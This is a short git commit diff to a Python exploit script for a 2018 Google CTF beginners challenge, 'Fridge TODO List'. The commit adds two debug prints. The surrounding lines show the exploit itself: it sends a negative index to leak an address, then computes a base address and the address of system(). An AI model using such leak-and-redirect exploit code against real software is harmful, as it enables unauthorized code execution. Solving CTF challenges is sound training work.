a74e8496bfecf3d2e15644db0d961945d0f8e773
KwonL <dlrnjsgud322@gmail.com>
2018-10-03 17:01:51 +0900

    modify

--- 2018/google_CTF/beginners_quests/Fridge_TODO_List/local_test.py
+++ 2018/google_CTF/beginners_quests/Fridge_TODO_List/local_test.py
@@ -9,7 +9,9 @@ r.readuntil("read?")
 r.send("-6\n")
 res = r.readuntil("Hi hacker,").splitlines()[0]
 write_addr = res.split(':',1)[1][1:].ljust(8,chr(0))
+print(write_addr.encode("hex"))
 write_addr = unpack("<Q",write_addr)[0]
+print(hex(write_addr))
 base_addr = write_addr-0x910
 system_addr = base_addr + 0x940
 print hex(system_addr)
